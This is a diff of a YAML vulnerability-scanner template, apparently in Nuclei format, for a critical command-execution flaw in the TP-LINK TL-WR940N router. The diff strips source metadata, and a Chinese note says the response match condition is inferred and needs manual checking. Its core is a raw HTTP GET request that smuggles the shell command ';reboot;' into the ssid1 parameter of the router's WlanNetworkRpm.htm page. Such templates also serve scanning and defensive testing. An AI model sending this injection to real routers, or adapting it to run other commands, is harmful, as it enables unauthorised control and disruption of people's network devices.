@@ -3,14 +3,8 @@ info:
   name: TP-LINKTL-WR940N命令执行漏洞 V2
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/weh6vp43ek4m54v4
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: weh6vp43ek4m54v4
-    fofa: 暂无
 http:
 - raw:
   - 'GET /UJOGPJXBZUFEBUDB/userRpm/WlanNetworkRpm.htm?ssid1=;reboot;&ssid2=TP-LINK_0000_2&ssid3=TP-LINK_0000_3&ssid4=TP-LINK_0000_4&region=101&band=0&mode=5&chanWidth=1&channel=9&rate=59&ap=1&broadcast=2&brlssid=&brlbssid=&addrType=1&keytype=1&wepindex=1&authtype=1&keytext=&Save=Save HTTP/1.1
